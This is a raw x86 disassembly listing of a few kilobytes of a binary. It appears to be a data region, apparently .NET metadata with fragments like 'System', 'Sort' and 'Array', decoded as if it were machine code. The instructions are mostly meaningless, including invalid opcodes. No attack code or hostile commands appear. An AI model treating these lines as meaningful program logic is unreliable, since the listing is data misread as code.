  40e433:	add    al,0x6f
  40e435:	rol    BYTE PTR [eax+edi*2],1
  40e438:	add    eax,0x57e057a
  40e43d:	test   DWORD PTR [ecx],eax
  40e43f:	add    eax,0x9c050186
  40e444:	add    esi,ebx
  40e446:	push   es
  40e447:	lods   eax,DWORD PTR ds:[esi]
  40e448:	add    esi,ebx
  40e44a:	push   es
  40e44b:	mov    cl,0x1
  40e44d:	fiadd  WORD PTR [esi]
  40e44f:	mov    eax,0xb906de01
  40e454:	add    esi,ebx
  40e456:	push   es
  40e457:	or     BYTE PTR [ecx+0x20],al
  40e45a:	and    eax,DWORD PTR [edx]
  40e45c:	or     cl,BYTE PTR [edi]
  40e45e:	push   ds
  40e45f:	and    edx,DWORD PTR [ebx+eax*2]
  40e462:	push   0x23
  40e464:	or     BYTE PTR [edx],al
  40e466:	and    ecx,DWORD PTR [edx]
  40e468:	and    ebx,DWORD PTR [edi]
  40e46a:	and    esp,DWORD PTR [ebx+eiz*1]
  40e46d:	daa    
  40e46e:	and    eax,DWORD PTR [ebp+0x23]
  40e471:	pop    esp
  40e472:	and    ebp,DWORD PTR [eax+0x23]
  40e475:	inc    eax
  40e476:	dec    eax
  40e477:	in     eax,dx
  40e478:	add    DWORD PTR [edi],edx
  40e47a:	adc    ecx,DWORD PTR [edi]
  40e47c:	or     eax,0x172c0a21
  40e481:	xor    al,0xd
  40e483:	inc    esi
  40e484:	or     dl,BYTE PTR [ecx+0x17]
  40e487:	pop    esp
  40e488:	mov    ebx,0x2986d06
  40e48d:	add    DWORD PTR [ecx],0x7b
  40e490:	xchg   ecx,eax
  40e491:	add    DWORD PTR [ebx-0x60],edi
  40e494:	add    DWORD PTR [ebp-0x62fe5dff],ebx
  40e49a:	add    DWORD PTR [esi-0x4efe62ff],ebp
  40e4a0:	add    DWORD PTR [ebp-0x62fe41ff],ebx
  40e4a6:	add    ebp,ecx
  40e4a8:	add    DWORD PTR [ebp-0x44fe24ff],ebx
  40e4ae:	push   es
  40e4af:	loope  0x40e4b2
  40e4b1:	rol    BYTE PTR [esi],cl
  40e4b3:	in     al,dx
  40e4b4:	add    DWORD PTR [edi],edx
  40e4b6:	or     al,0x4e
  40e4b8:	jb     0x40e4bb
  40e4ba:	add    al,0x50
  40e4bc:	add    DWORD PTR [esi+0x1],edx
  40e4bf:	add    ch,BYTE PTR gs:[ebx+0x1]
  40e4c3:	push   cs
  40e4c4:	dec    edi
  40e4c5:	arpl   WORD PTR [ecx],ax
  40e4c7:	add    eax,0x3c393c14
  40e4cc:	push   eax
  40e4cd:	cmp    al,0x54
  40e4cf:	cmp    eax,0x5c110162
  40e4d4:	pop    DWORD PTR [ecx]
  40e4d6:	add    DWORD PTR [esi],eax
  40e4d8:	push   cs
  40e4d9:	add    DWORD PTR [ecx],esp
  40e4db:	add    DWORD PTR [esi],ebp
  40e4dd:	add    DWORD PTR [edi+0x1],ecx
  40e4e0:	push   ebp
  40e4e1:	add    DWORD PTR [edx+0x1],edi
  40e4e4:	push   ebp
  40e4e5:	popa   
  40e4e6:	stc    
  40e4e7:	add    eax,DWORD PTR [ecx]
  40e4e9:	push   ds
  40e4ea:	or     DWORD PTR [ecx],eax
  40e4ec:	push   ss
  40e4ed:	add    ebx,DWORD PTR [edi]
  40e4ef:	add    DWORD PTR [edx],esi
  40e4f1:	add    DWORD PTR [ebx],edi
  40e4f3:	add    DWORD PTR [esi+0x1],ecx
  40e4f6:	pop    edi
  40e4f7:	add    DWORD PTR [eax+0x3],ebp
  40e4fa:	jo     0x40e4fd
  40e4fc:	jbe    0x40e4ff
  40e4fe:	jge    0x40e57b
  40e500:	mov    DWORD PTR [ecx],eax
  40e502:	cmp    al,0x9f
  40e504:	add    DWORD PTR [edi+ebp*4],edi
  40e507:	add    DWORD PTR [ebx+eax*1-0x53c3fe36],esp
  40e50e:	add    bh,BYTE PTR [eax+ecx*8]
  40e511:	add    bh,BYTE PTR [ecx+edx*8]
  40e514:	add    bh,BYTE PTR [edx+ebx*8]
  40e517:	add    bh,BYTE PTR [ebx+eiz*8]
  40e51a:	add    bh,BYTE PTR [eax+esi*8]
  40e51d:	add    bh,BYTE PTR [esi+esi*8]
  40e520:	add    bh,BYTE PTR [edx+ebx*4]
  40e523:	add    edi,DWORD PTR [ecx+eiz*4]
  40e526:	add    edi,DWORD PTR [esp+ebp*4+0x3]
  40e52a:	add    esp,ebp
  40e52c:	add    eax,DWORD PTR [ecx]
  40e52e:	out    dx,al
  40e52f:	add    eax,DWORD PTR [ecx]
  40e531:	icebp  
  40e532:	add    eax,DWORD PTR [ecx]
  40e534:	test   DWORD PTR [ebx],0x103f801
  40e53a:	add    al,0x62
  40e53c:	and    al,0x1
  40e53e:	add    BYTE PTR ds:0x1b00263,al
  40e544:	add    BYTE PTR [esp+ebp*2],al
  40e547:	pop    esp
  40e548:	cmp    al,0x0
  40e54a:	add    al,0x73
  40e54c:	pop    es
  40e54d:	or     eax,0x31750800
  40e552:	or     eax,0x300d0d02
  40e557:	or     eax,0xd0e7704
  40e55c:	add    BYTE PTR [ebx],bl
  40e55e:	js     0x40e531
  40e560:	add    DWORD PTR ds:0xe0d0609,ecx
  40e566:	or     eax,0xd6a0d63
  40e56b:	jb     0x40e57a
  40e56d:	mov    eax,ds:0x1a80d01
  40e572:	or     eax,0xd00d01be
  40e577:	add    DWORD PTR ds:0x3aa791e,ecx
  40e57d:	or     eax,0x240d230b
  40e582:	or     eax,0xd490d3e
  40e587:	push   edx
  40e588:	or     eax,0xd5f0d5b
  40e58d:	jge    0x40e59c
  40e58f:	in     al,dx
  40e590:	add    DWORD PTR ds:0xa90d02b1,ecx
  40e596:	add    ecx,DWORD PTR ds:0x1277b0c
  40e59c:	add    al,0x2
  40e59e:	add    DWORD PTR ds:0x25011801,ecx
  40e5a4:	add    DWORD PTR [esp+edi*2],ecx
  40e5a7:	sub    ecx,DWORD PTR ds:0x110d0204
  40e5ad:	or     eax,0xd290d1c
  40e5b2:	das    
  40e5b3:	jge    0x40e555
  40e5b5:	add    cl,BYTE PTR [ebx]
  40e5b7:	cmove  ecx,DWORD PTR [ebx]
  40e5ba:	pop    esi
  40e5bb:	or     esp,DWORD PTR [esi+0xb]
  40e5be:	add    DWORD PTR [ecx],0xb
  40e5c1:	test   DWORD PTR [ecx],eax
  40e5c3:	add    ebp,DWORD PTR [ecx+eax*1+0x301c003]
  40e5ca:	fadd   DWORD PTR [ecx]
  40e5cc:	add    ebp,eax
  40e5ce:	add    DWORD PTR [esi],ecx
  40e5d0:	icebp  
  40e5d1:	add    DWORD PTR [ebx],ecx
  40e5d3:	repz add DWORD PTR [ebx],ecx
  40e5d6:	test   DWORD PTR [ecx],0xb01fe0b
  40e5dc:	inc    DWORD PTR [ecx]
  40e5de:	or     ebx,DWORD PTR [edi+0x7e130b02]
  40e5e4:	push   0x360501e8
  40e5e9:	call   0x21338ef
  40e5ee:	pop    ebx
  40e5ef:	aad    0x1
  40e5f1:	pop    ebp
  40e5f2:	adc    esp,DWORD PTR [edi-0x2b]
  40e5f5:	add    DWORD PTR [eax],esi
  40e5f7:	jg     0x40e5a6
  40e5f9:	add    dl,cl
  40e5fb:	add    DWORD PTR [ecx+edi*1],ecx
  40e5fe:	rol    DWORD PTR [ecx],1
  40e600:	push   edx
  40e601:	add    DWORD PTR [ecx],0x5e
  40e604:	add    DWORD PTR [ecx],0x76
  40e607:	add    DWORD PTR [ecx],0x7b
  40e60a:	mov    ch,0x1
  40e60c:	sti    
  40e60d:	add    DWORD PTR [eax-0x7cfd78fe],edi
  40e613:	add    DWORD PTR [ecx-0x62fe7cfe],ecx
  40e619:	add    al,BYTE PTR [ebx-0x33fd61ff]
  40e61f:	add    DWORD PTR [eax+0x2ac0502],esp
  40e625:	int3   
  40e626:	add    DWORD PTR ds:0x10700180,ecx
  40e62c:	add    al,0x2f
  40e62e:	adc    BYTE PTR [ecx],dh
  40e630:	adc    BYTE PTR [esi+0x10],dl
  40e633:	outs   dx,BYTE PTR ds:[esi]
  40e634:	adc    BYTE PTR [ebx],cl
  40e636:	add    DWORD PTR [ecx],0x2f030a4b
  40e63c:	or     dh,BYTE PTR [ecx]
  40e63e:	or     cl,BYTE PTR [ecx+0xa]
  40e641:	or     eax,DWORD PTR [edx+0x3014c01]
  40e647:	das    
  40e648:	add    DWORD PTR [ecx],esi
  40e64a:	add    DWORD PTR [edx+0x1],ecx
  40e64d:	and    al,BYTE PTR [ebp+0x2028f01]
  40e653:	or     esi,DWORD PTR ds:0x53024702
  40e659:	add    ch,BYTE PTR [edx+0x2]
  40e65c:	ins    BYTE PTR es:[edi],dx
  40e65d:	cmp    al,ah
  40e65f:	add    DWORD PTR [edx],edi
  40e661:	jmp    0x22be867
  40e666:	add    bh,bh
  40e668:	add    DWORD PTR [edx],eax
  40e66a:	add    BYTE PTR [edx],0x2
  40e66d:	mov    es,WORD PTR [edx]
  40e66f:	add    ah,BYTE PTR [ebx]
  40e671:	xchg   BYTE PTR [ecx],al
  40e673:	mov    edx,0xa03c901
  40e678:	xor    cl,cl
  40e67a:	add    esi,DWORD PTR [ecx+ecx*8]
  40e67d:	add    edx,DWORD PTR [eax-0x37]
  40e680:	add    edx,DWORD PTR [edx-0x37]
  40e683:	add    ebx,DWORD PTR [ebp+0x2]
  40e686:	pop    esi
  40e687:	add    dh,BYTE PTR [ebp+0x2]
  40e68a:	lahf   
  40e68b:	add    DWORD PTR [edx],eax
  40e68d:	stos   BYTE PTR es:[edi],al
  40e68e:	add    DWORD PTR [edx],eax
  40e690:	mov    eax,0x2e03c701
  40e695:	xchg   DWORD PTR [ecx],eax
  40e697:	mov    al,BYTE PTR [edx]
  40e699:	retf   
  40e69a:	add    ecx,DWORD PTR [ebx]
  40e69c:	or     eax,0x3cb3007
  40e6a1:	fs retf 
  40e6a3:	add    esi,DWORD PTR [ebp-0x35]
  40e6a6:	add    ecx,ecx
  40e6a8:	add    edi,esp
  40e6aa:	add    ebx,ecx
  40e6ac:	add    DWORD PTR [edx-0x34fe1bf9],esi
  40e6b2:	add    edi,ebx
  40e6b4:	add    ebx,ecx
  40e6b6:	add    edi,edi
  40e6b8:	add    ebx,ecx
  40e6ba:	add    eax,DWORD PTR [esi-0x78fc34fe]
  40e6c0:	add    al,bh
  40e6c2:	add    eax,DWORD PTR ds:0x10a0188
  40e6c8:	add    BYTE PTR ds:0xd01018a,al
  40e6ce:	add    BYTE PTR [edx],bl
  40e6d0:	mov    WORD PTR [ecx],es
  40e6d2:	mov    ah,0x3
  40e6d4:	sbb    al,BYTE PTR [edi]
  40e6d6:	push   edi
  40e6d7:	sbb    dl,BYTE PTR [esi+0x19e1a01]
  40e6dd:	add    ecx,edi
  40e6df:	add    DWORD PTR [ecx],ebx
  40e6e1:	add    DWORD PTR [edx],0x2028902
  40e6e7:	add    BYTE PTR [ebx],0x17
  40e6ea:	jge    0x14398f1
  40e6f0:	add    al,0xc
  40e6f2:	add    DWORD PTR [esi],ebx
  40e6f4:	add    DWORD PTR ds:0x102b101,edi
  40e6fa:	or     ecx,DWORD PTR [esi+0x3182e01]
  40e700:	adc    cl,BYTE PTR ds:0x182d1828
  40e706:	or     DWORD PTR [edi+0x2184d01],ecx
  40e70c:	inc    edi
  40e70d:	sbb    BYTE PTR [eax+ebx*1+0x7],cl
  40e711:	nop
  40e712:	add    DWORD PTR [ecx],esi
  40e714:	or     eax,DWORD PTR [ecx]
  40e716:	xor    BYTE PTR [ebx],cl
  40e718:	pop    es
  40e719:	xchg   ecx,eax
  40e71a:	add    DWORD PTR [ecx],ebx
  40e71c:	or     al,BYTE PTR [ecx]
  40e71e:	sbb    BYTE PTR [edx],cl
  40e720:	add    eax,0xd0e0192
  40e725:	add    BYTE PTR ds:0xb270194,al
  40e72b:	add    BYTE PTR ds:0xa270195,al
  40e731:	add    BYTE PTR ds:0x18130196,al
  40e737:	add    BYTE PTR ds:0x8270198,al
  40e73d:	add    BYTE PTR [ecx],cl
  40e73f:	popf   
  40e740:	add    DWORD PTR [ebx],ebx
  40e742:	xor    eax,0x1a350802
  40e747:	xor    eax,0xc019f05
  40e74c:	sbb    BYTE PTR [eax],al
  40e74e:	add    eax,0xb1701b8
  40e753:	add    BYTE PTR ds:0xa1701ba,al
  40e759:	add    BYTE PTR ds:0x81701be,al
  40e75f:	add    BYTE PTR [ecx],al
  40e761:	add    BYTE PTR [eax],al
  40e763:	add    BYTE PTR [ecx],al
  40e765:	add    BYTE PTR [eax],al
  40e767:	add    BYTE PTR [eax],al
  40e769:	rcr    BYTE PTR ds:0x28000000,0x1
  40e770:	add    BYTE PTR [eax],al
  40e772:	add    BYTE PTR [eax],ah
  40e774:	les    eax,FWORD PTR [ecx]
  40e776:	add    al,BYTE PTR [eax]
  40e778:	add    BYTE PTR [eax],al
  40e77a:	mov    al,ds:0x1560124
  40e77f:	push   edx
  40e780:	add    DWORD PTR [ebx+0x1],edx
  40e783:	popa   
  40e784:	add    DWORD PTR [edi+0x1],ecx
  40e787:	push   eax
  40e788:	add    DWORD PTR [ecx+0x1],edx
  40e78b:	pop    edx
  40e78c:	add    DWORD PTR [eax+0x1],esp
  40e78f:	push   ebp
  40e790:	add    DWORD PTR [ebx+0x1],esp
  40e793:	push   edi
  40e794:	add    DWORD PTR [ecx+0x1],ebx
  40e797:	push   esp
  40e798:	add    DWORD PTR [ebx+0x1],ebx
  40e79b:	pop    esp
  40e79c:	add    DWORD PTR [ebp+0x1],ebx
  40e79f:	pop    esi
  40e7a0:	add    DWORD PTR [edi+0x1],ebx
  40e7a3:	scas   eax,DWORD PTR es:[edi]
  40e7a4:	add    DWORD PTR [ebx],eax
  40e7a6:	add    BYTE PTR [eax],al
  40e7a8:	add    al,ah
  40e7aa:	add    DWORD PTR fs:[edx],ebp
  40e7ad:	add    DWORD PTR [esi],ebp
  40e7af:	add    DWORD PTR [esi],esi
  40e7b1:	add    DWORD PTR ds:0x15023e01,edi
  40e7b7:	add    BYTE PTR [eax],al
  40e7b9:	add    BYTE PTR [ecx],al
  40e7bb:	add    DWORD PTR [edx],eax
  40e7bd:	add    al,0x1
  40e7bf:	add    BYTE PTR [eax],dl
  40e7c1:	call   0x23d3ecc9
  40e7c6:	add    al,al
  40e7c8:	add    eax,0x221306
  40e7cd:	add    BYTE PTR [eax],dl
  40e7cf:	pop    es
  40e7d0:	xchg   ebx,eax
  40e7d1:	and    edx,DWORD PTR [eax]
  40e7d3:	loopne 0x40e7d9
  40e7d5:	or     BYTE PTR [ebx+0x11000023],al
  40e7db:	or     DWORD PTR [ecx],edx
  40e7dd:	and    dl,BYTE PTR [eax]
  40e7df:	add    BYTE PTR [ecx],cl
  40e7e1:	or     dl,BYTE PTR [ebx+0x7c01023]
  40e7e7:	or     eax,DWORD PTR [ecx]
  40e7e9:	add    BYTE PTR [eax],al
  40e7eb:	add    BYTE PTR [edx],dl
  40e7ed:	or     al,0x3
  40e7ef:	and    al,BYTE PTR [eax]
  40e7f1:	add    BYTE PTR [edx],cl
  40e7f3:	or     eax,0xc0002253
  40e7f8:	push   ss
  40e7f9:	or     edx,DWORD PTR [edi]
  40e7fb:	or     eax,DWORD PTR [esi]
  40e7fd:	push   cs
  40e7fe:	adc    esp,DWORD PTR [edx]
  40e800:	adc    BYTE PTR [eax+0xb0e0b19],al
  40e806:	add    DWORD PTR [eax+0xb06c080],0x1080808b
  40e810:	sgdtd  [eax]
  40e813:	add    BYTE PTR [eax],ah
  40e815:	or     al,0x10
  40e817:	add    DWORD PTR [ecx],0xb0d0000
  40e81d:	ud2    
  40e81f:	add    DWORD PTR [eax],eax
  40e821:	add    BYTE PTR [eax],al
  40e823:	or     eax,DWORD PTR [eax]
  40e825:	popa   
  40e826:	add    BYTE PTR [eax],al
  40e828:	add    BYTE PTR [ecx+0x6c88080],al
  40e82e:	adc    DWORD PTR [edx],esp
  40e830:	add    BYTE PTR [eax],al
  40e832:	add    BYTE PTR [edx],al
  40e834:	adc    DWORD PTR [esi+0x12308080],esp
  40e83a:	pop    es
  40e83b:	sbb    BYTE PTR [eax],al
  40e83d:	add    BYTE PTR [eax],ch
  40e83f:	adc    ch,BYTE PTR [ecx]
  40e841:	adc    bl,BYTE PTR [edx+edx*1+0x62]
  40e845:	adc    eax,DWORD PTR ds:0x4e000000
  40e84b:	adc    esp,DWORD PTR [ecx+0x12]
  40e84e:	dec    edi
  40e84f:	adc    ebx,DWORD PTR [ebx]
  40e851:	adc    al,BYTE PTR [ebx]
  40e853:	adc    al,0x87
  40e855:	sbb    DWORD PTR [eax],eax
  40e857:	loopne 0x40e85d
  40e859:	adc    eax,0xc0001807
  40e85e:	add    eax,0x6130913
  40e863:	adc    bh,BYTE PTR [ebx+0x15]
  40e866:	add    BYTE PTR [ecx],0x15
  40e869:	mov    BYTE PTR [ecx],al
  40e86b:	push   ss
  40e86c:	xchg   DWORD PTR [eax],ebx
  40e86e:	add    al,al
  40e870:	lea    eax,[ecx]
  40e872:	push   ss
  40e873:	adc    DWORD PTR [edx],edx
  40e875:	push   ss
  40e876:	adc    cl,BYTE PTR [esi]
  40e878:	adc    dl,BYTE PTR [edx+edx*1]
  40e87b:	adc    BYTE PTR [edx],dl
  40e87d:	adc    dl,BYTE PTR [edx]
  40e87f:	or     BYTE PTR [ebx],dl
  40e881:	jae    0x40e89a
  40e883:	add    ebx,DWORD PTR [eax]
  40e885:	add    al,al
  40e887:	jne    0x40e8a0
  40e889:	ja     0x40e8a3
  40e88b:	sbb    DWORD PTR [eax],0x0
  40e88e:	sar    BYTE PTR [eax+0x18],0x79
  40e892:	sbb    BYTE PTR [edi+edx*1+0x7d],bh
  40e896:	pop    ss
  40e897:	jle    0x40e8b2
  40e899:	sbb    DWORD PTR [ecx],0x0
  40e89c:	sar    BYTE PTR [edi+0x18],0x80
  40e8a0:	add    DWORD PTR [ecx],ebx
  40e8a2:	add    DWORD PTR [ecx],0x17018518
  40e8a8:	xchg   BYTE PTR [ecx],al
  40e8aa:	sbb    DWORD PTR [edi+0x18a1901],eax
  40e8b0:	pop    ss
  40e8b1:	mov    WORD PTR [ecx],es
  40e8b3:	sbb    BYTE PTR [esi+0x18f1701],cl
  40e8b9:	pop    ss
  40e8ba:	nop
  40e8bb:	add    DWORD PTR [eax],ebx
  40e8bd:	xchg   ecx,eax
  40e8be:	add    DWORD PTR [edi],edx
  40e8c0:	sbb    bl,BYTE PTR [edx]
  40e8c2:	add    ebx,DWORD PTR [eax]
  40e8c4:	add    BYTE PTR [eax],al
  40e8c6:	adc    ebx,DWORD PTR [edx]
  40e8c8:	or     ebx,DWORD PTR [edx]
  40e8ca:	xchg   edx,eax
  40e8cb:	add    DWORD PTR [edx],ebx
  40e8cd:	sub    al,0x1a
  40e8cf:	sbb    dh,BYTE PTR ss:[ecx]
  40e8d2:	sbb    bh,BYTE PTR [eax]
  40e8d4:	sbb    bh,BYTE PTR [ebx]
  40e8d6:	sbb    bh,BYTE PTR ds:0x18831b
  40e8dc:	add    BYTE PTR [ebx+0x1a],al
  40e8df:	aas    
  40e8e0:	sbb    al,0x81
  40e8e2:	add    BYTE PTR [eax],al
  40e8e4:	add    BYTE PTR [eax+0x1b],al
  40e8e7:	and    cl,BYTE PTR [ebx]
  40e8e9:	and    eax,0x241a231a
  40e8ee:	sbb    ah,BYTE PTR [edi]
  40e8f0:	sbb    bh,BYTE PTR [ecx]
  40e8f2:	sbb    al,BYTE PTR [ecx+0xb]
  40e8f5:	pop    ss
  40e8f6:	sbb    dh,BYTE PTR [eax]
  40e8f8:	sbb    dl,BYTE PTR [esi+0x19d1a01]
  40e8fe:	sbb    al,0x9f
  40e900:	add    DWORD PTR [edx],ebx
  40e902:	xor    al,0x1a
  40e904:	dec    eax
  40e905:	sbb    ch,BYTE PTR ds:0x321a2e17
  40e90b:	pop    ss
  40e90c:	xor    edx,DWORD PTR [edi]
  40e90e:	or     eax,0x631a6c1b
  40e913:	or     esi,DWORD PTR [ebp+ebx*1+0x2]
  40e917:	add    BYTE PTR [eax],al
  40e919:	shl    BYTE PTR [esi+0x1d],0x7a
  40e91d:	push   ds
  40e91e:	add    cl,BYTE PTR [eax]
  40e920:	add    al,al
  40e922:	add    DWORD PTR [ecx],0x1e
  40e925:	test   BYTE PTR [ecx],al
  40e927:	push   ds
  40e928:	mov    DWORD PTR [ecx],eax
  40e92a:	push   ds
  40e92b:	mov    eax,DWORD PTR [ecx]
  40e92d:	push   ds
  40e92e:	aaa    
  40e92f:	sbb    eax,0x18031f35
  40e934:	add    BYTE PTR [eax-0x7cdffe6c],al
  40e93a:	sbb    DWORD PTR [eax],eax
  40e93c:	add    BYTE PTR [eax+0x1952001],bh
  40e942:	sbb    bh,BYTE PTR [edx+0x1a1e1a01]
  40e948:	cwde   
  40e949:	add    DWORD PTR [edx],ebx
  40e94b:	mov    esi,0xd1a01
  40e950:	add    BYTE PTR [eax],al
  40e952:	mov    al,ds:0x2101
  40e957:	add    BYTE PTR [eax-0x5ddefe5f],al
  40e95d:	add    DWORD PTR [ecx],esp
  40e95f:	add    al,BYTE PTR [eax]
  40e961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e962:	add    DWORD PTR [ecx],esp
  40e964:	xchg   ecx,eax
  40e965:	add    DWORD PTR [ecx],esp
  40e967:	xchg   edx,eax
  40e968:	add    DWORD PTR [ecx],esp
  40e96a:	xchg   ebx,eax
  40e96b:	add    DWORD PTR [ecx],esp
  40e96d:	xchg   esp,eax
  40e96e:	add    DWORD PTR [ecx],esp
  40e970:	xchg   ebp,eax
  40e971:	add    DWORD PTR [ecx],esp
  40e973:	xchg   esi,eax
  40e974:	add    DWORD PTR [ecx],esp
  40e976:	xchg   edi,eax
  40e977:	add    DWORD PTR [ecx],esp
  40e979:	cwde   
  40e97a:	add    DWORD PTR [ecx],esp
  40e97c:	adc    eax,0xf000000
  40e981:	add    BYTE PTR [ebx],cl
  40e983:	add    BYTE PTR [eax+eax*1],cl
  40e986:	sbb    al,BYTE PTR [eax]
  40e988:	or     BYTE PTR [ebx],al
  40e98a:	or     DWORD PTR [eax],eax
  40e98c:	or     al,BYTE PTR [eax]
  40e98e:	adc    eax,DWORD PTR [eax]
  40e990:	sbb    DWORD PTR [eax],eax
  40e992:	push   cs
  40e993:	add    BYTE PTR [ebx],bl
  40e995:	add    BYTE PTR [eax],dl
  40e997:	add    BYTE PTR [edx],dl
  40e999:	add    BYTE PTR ds:0x15001400,cl
  40e99f:	add    BYTE PTR [esi],dl
  40e9a1:	add    BYTE PTR [edi],dl
  40e9a3:	add    BYTE PTR [eax],bl
  40e9a5:	add    dh,ah
  40e9a7:	add    DWORD PTR [eax],eax
  40e9a9:	sbb    al,0x0
  40e9ab:	sbb    al,0x0
  40e9ad:	add    BYTE PTR [eax],al
  40e9af:	or     al,0x22
  40e9b1:	add    BYTE PTR [eax],al
  40e9b3:	add    al,cl
  40e9b5:	or     eax,DWORD PTR [eax]
  40e9b7:	or     al,BYTE PTR [eax]
  40e9b9:	or     DWORD PTR [eax],eax
  40e9bb:	or     BYTE PTR [eax],al
  40e9bd:	pop    es
  40e9be:	add    BYTE PTR [esi],al
  40e9c0:	add    BYTE PTR ds:0x3000400,al
  40e9c6:	add    BYTE PTR [edx],al
  40e9c8:	add    BYTE PTR [ecx],al
  40e9ca:	add    BYTE PTR ds:0xf000e00,cl
  40e9d0:	add    BYTE PTR [eax],dl
  40e9d2:	add    BYTE PTR [ecx],dl
  40e9d4:	add    BYTE PTR [edx],dl
  40e9d6:	add    BYTE PTR [ebx],dl
  40e9d8:	add    BYTE PTR [eax+eax*1],dl
  40e9db:	adc    eax,0x1a221b00
  40e9e0:	and    bl,BYTE PTR [eax+eax*1]
  40e9e3:	sub    esp,DWORD PTR [edx]
  40e9e5:	sub    al,BYTE PTR [eax]
  40e9e7:	sub    al,0x22
  40e9e9:	sub    eax,0x100
  40e9ee:	add    BYTE PTR [ecx],al
  40e9f0:	add    BYTE PTR [eax+eax*1],cl
  40e9f3:	add    BYTE PTR [eax],al
  40e9f5:	add    DWORD PTR [eax],eax
  40e9f7:	add    al,BYTE PTR [eax]
  40e9f9:	add    eax,DWORD PTR [eax]
  40e9fb:	add    al,0x0
  40e9fd:	add    eax,0x7000600
  40ea02:	add    BYTE PTR [eax],cl
  40ea04:	add    BYTE PTR [ecx],cl
  40ea06:	add    BYTE PTR [edx],cl
  40ea08:	add    BYTE PTR [ebx],cl
  40ea0a:	add    BYTE PTR [eax+eax*1],cl
  40ea0d:	push   ss
  40ea0e:	add    BYTE PTR [eax],al
  40ea10:	add    dh,ah
  40ea12:	add    eax,DWORD PTR [eax]
  40ea14:	std    
  40ea15:	add    eax,DWORD PTR [eax]
  40ea17:	stos   BYTE PTR es:[edi],al
  40ea18:	add    eax,0x6b500
  40ea1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea1e:	pop    es
  40ea1f:	add    bh,ch
  40ea21:	pop    es
  40ea22:	add    BYTE PTR [eax+ecx*1+0x3ef00],dh
  40ea29:	test   DWORD PTR [ebx],esp
  40ea2b:	add    BYTE PTR [esi+0x49940029],bl
  40ea31:	add    BYTE PTR [ecx+0xa0049],dh
  40ea37:	add    BYTE PTR ss:[eax],al
  40ea3a:	add    BYTE PTR [ecx+0x5dc9000c],al
  40ea40:	add    ah,ah
  40ea42:	add    al,BYTE PTR [eax]
  40ea44:	lock add DWORD PTR [eax],eax
  40ea47:	fld    DWORD PTR [ecx]
  40ea49:	add    BYTE PTR [ebx+0x66b32101],bl
  40ea4f:	and    DWORD PTR [edx],ebx
  40ea51:	add    BYTE PTR [eax],al
  40ea53:	add    BYTE PTR [edx+ecx*1+0x27000100],ah
  40ea5a:	add    cl,bh
  40ea5c:	add    al,BYTE PTR [eax]
  40ea5e:	and    DWORD PTR [ecx],0x20bd00
  40ea64:	mov    al,ds:0x1fff0029
  40ea69:	add    BYTE PTR [edi+0x29810020],dh
  40ea6f:	add    dh,ah
  40ea71:	and    BYTE PTR [eax],al
  40ea73:	test   eax,0x21a70029
  40ea78:	add    ch,ch
  40ea7a:	and    DWORD PTR [eax],eax
  40ea7c:	sti    
  40ea7d:	and    DWORD PTR [eax],eax
  40ea7f:	xchg   BYTE PTR [edx],ah
  40ea81:	add    BYTE PTR [edi+0x3a50022],dh
  40ea87:	add    BYTE PTR [edx],cl
  40ea89:	add    BYTE PTR [edi+0x3b0016],ah
  40ea8f:	xchg   ebx,eax
  40ea90:	or     al,BYTE PTR [eax]
  40ea92:	call   0x8000:0x4f60005
  40ea99:	add    eax,0x21058e00
  40ea9e:	pop    ss
  40ea9f:	add    BYTE PTR [eax],al
  40eaa1:	add    cl,bh
  40eaa3:	add    DWORD PTR [ecx],esp
  40eaa5:	xlat   BYTE PTR ds:[ebx]
  40eaa6:	add    ah,BYTE PTR [ecx]
  40eaa8:	add    DWORD PTR [eax],eax
  40eaaa:	pop    ds
  40eaab:	add    BYTE PTR [edi],ch
  40eaad:	add    BYTE PTR [edi+0x0],dl
  40eab0:	jns    0x40eab2
  40eab2:	pop    DWORD PTR [ecx]
  40eab4:	add    BYTE PTR [ecx+0x1cd0001],dh
  40eaba:	add    BYTE PTR [ecx+0x3a90003],al
  40eac0:	add    cl,cl
  40eac2:	add    eax,DWORD PTR [eax]
  40eac4:	out    0x3,eax
  40eac6:	add    BYTE PTR [edx+0x9cc0005],al
  40eacc:	add    BYTE PTR [esi+0x5fa0005],ah
  40ead2:	add    BYTE PTR [esi+0x5aa0005],dh
  40ead8:	add    dl,bl
  40eada:	or     DWORD PTR [eax],eax
  40eadc:	dec    BYTE PTR [ecx]
  40eade:	add    dh,dl
  40eae0:	or     DWORD PTR [ecx],esp
  40eae2:	push   cs
  40eae3:	push   es
  40eae4:	add    DWORD PTR [eax+0x7068880],0x74737953
  40eaee:	gs ins DWORD PTR es:[edi],dx
  40eaf0:	add    BYTE PTR [eax],dl
  40eaf2:	pop    es
  40eaf3:	add    DWORD PTR [eax+0x1069080],0x41060100
  40eafd:	jb     0x40eb71
  40eaff:	popa   
  40eb00:	jns    0x40eb02
  40eb02:	push   cs
  40eb03:	or     BYTE PTR [ecx+0x6988080],al
  40eb09:	pop    es
  40eb0a:	adc    BYTE PTR [ecx],al
  40eb0c:	add    DWORD PTR [ecx],eax
  40eb0e:	sbb    eax,0x813001e
  40eb13:	add    dl,BYTE PTR [eax]
  40eb15:	adc    BYTE PTR [ecx],al
  40eb17:	add    al,0x1
  40eb19:	sbb    eax,0x808001e
  40eb1e:	adc    eax,0x1bc8012
  40eb23:	push   ds
  40eb24:	add    BYTE PTR [esi],cl
  40eb26:	or     DWORD PTR [ecx+0x6a08080],eax
  40eb2c:	add    DWORD PTR [ecx],eax
  40eb2e:	add    eax,0x74726f53
  40eb33:	add    BYTE PTR [edx],cl
  40eb35:	or     DWORD PTR [edx],eax
  40eb37:	add    DWORD PTR [edx],eax
  40eb39:	add    eax,0x74726f53
  40eb3e:	add    BYTE PTR [edx],cl
  40eb40:	add    al,0x81
  40eb42:	add    BYTE PTR [eax+0x1d0306c0],0x12
  40eb49:	cmp    BYTE PTR [edi],cl
  40eb4b:	add    eax,0xc8808081
  40eb50:	push   es
  40eb51:	or     BYTE PTR [edi],bh
  40eb53:	add    DWORD PTR [edx],edx
  40eb55:	add    al,0x6
  40eb57:	add    DWORD PTR [edx],edx
  40eb59:	cmp    BYTE PTR [ebx],cl
  40eb5b:	add    eax,0x13f0802
  40eb60:	adc    al,BYTE PTR [esi+eax*1]
  40eb63:	add    dl,BYTE PTR [edx]
  40eb65:	cmp    BYTE PTR [edx],cl
  40eb67:	(bad)  
  40eb68:	(bad)  
  40eb69:	(bad)  
  40eb6a:	dec    DWORD PTR [edi]
